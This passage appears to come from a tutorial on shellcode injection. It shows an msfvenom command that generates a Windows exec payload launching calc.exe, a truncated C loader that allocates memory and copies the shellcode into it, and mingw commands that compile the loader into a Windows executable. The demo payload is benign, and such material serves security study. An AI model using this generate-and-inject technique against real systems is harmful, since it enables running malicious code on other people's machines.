...
## **Example 2: shellcode to spawn calc.exe**

## Generate metasploit shellcode.


```bash
kant@APPLEs-MacBook-Pro ~/m/shellcode-injection> /opt/metasploit-framework/bin/msfvenom -p windows/x64/exec CMD="calc.exe" -f c
Running the 'init' command for the database:
Existing database found, attempting to start it
Starting database at /Users/kant/.msf4/db...waiting for server to start.... done
server started
...
int main() {
	...
	printf("Allocating memory....for shellcode: %p\n", exec);
	...
	printf("Moved shellcode to the allocated space: %p\n", exec);
...
```bash
kant@APPLEs-MacBook-Pro ~/m/shellcode-injection> x86_64-w64-mingw32-g++ shell_codeinjection.cpp -static -o shellcode_injection
kant@APPLEs-MacBook-Pro ~/m/shellcode-injection> file shellcode_injection.exe 
shellcode_injection.exe: PE32+ executable (console) x86-64, for MS Windows, 19 sections
```

---


![Banner](https://github.com/user-attachments/assets/9b043a8e-7ca2-46e1-8d03-82e671edd84a)
